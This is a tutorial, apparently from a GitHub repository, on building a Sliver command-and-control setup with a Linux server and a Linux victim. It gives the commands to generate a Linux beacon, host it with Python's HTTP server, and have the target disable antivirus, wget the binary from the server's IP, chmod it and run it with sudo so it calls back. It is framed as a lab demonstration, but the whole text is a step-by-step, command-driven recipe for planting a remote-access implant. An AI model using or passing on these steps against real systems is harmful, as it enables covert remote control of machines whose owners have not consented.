
# How To Create a C2 Server Using Sliver (Linux - Linux)


This tutorial is a followup to the README for going from a Linux Host to a Linux Client instead of Linux Host -> Windows Client

## Server

All instructions up to this point are the same, except the way the beacon is generated. To generate for Linux instead of Windows, run this command with these flags:

`generate beacon -b YOURIP:8080 --os linux -a x86`

* The -os flag can be `mac` or `linux` and
* The -a flag is `x86` or `arm` (depending on your machine)

This will generate the binary for your Linux machine, and you can continue on in this guide for the remaining steps

## Serve Up Executable

The next step is somewhat up to personal preference and can be done in countless ways. The way I will be covering will be using python, but you can also use apache or any other http protocol file server of your choice. This step doesn't even need to necessarily be done using HTTP, as there are also DNS, TCP, and other methods of transferring this executable, but HTTP is the simplest, so that's the one we went with.

To start a webserver using python, first check that you have python installed on your machine (it does not need to be python3).

I would *highly recommend* hosting this server as a background process using & so that you can reopen sliver, although you could also run this server inside a container or on another page of your terminal if your machine supports that.

If you have python3, you can run this command: `python3 -m http.server &`. If you have a valid internet connection, you should get a response saying your machine is now hosting on 0.0.0.0:8000.

If you do not have python3, you can run this command: `python -m SimpleHTTPServer &`.

Both of these methods should result in the same outcome, with a simple http server hosting the files on your current directory.

## Client (To Be Infected)
Now that we have a file server on our Linux machine that is serving up the executable file, we can move on to our Windows Machine.
> Note the infected machine can also be a Linux machine, but it will not have some of the same features as a Windows client


### Disable Anti-Virus Protections
If you have any pre-existing antivirus protection, you will most likely need to disable them for this demonstration.

### Open Server on Any Internet Browser (or using wget)

Next, open any internet browser (if you have one) or use wget to access the file server that was previously opened in the Serve Up Executable step.

Using an internet browser, go to `http://LINUX_SERVER_IP:8000` and download the executable.

However, because some Linux distributions do not come prepackaged with an internet explorer (or UI at all), we will also be covering how to use wget.

### WGET
To use wget, type in your terminal:
`wget http://LINUX_SERVER_IP:8000/*YOURBINARYFILE*`

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/4e65b523-a057-4081-a879-824d2ae8e5e5)

This should install the file to the directory you are currently in.

Give the script executable permissions using `CHMOD 777 *NAME_OF_BINARY*`

Then, simply run the binary in the background with sudo ./*NAME_OF_BINARY* &

Your Linux machine should now appear in your beacons!

![image](https://github.com/kevinmstapleton/sliver-setup/assets/59635226/60ad21d3-25a4-4fa9-9beb-08cc266bb48c)


Now, you can continue back to the original guide starting at 'The Door's Open, Now What?' in the [README](README.md)
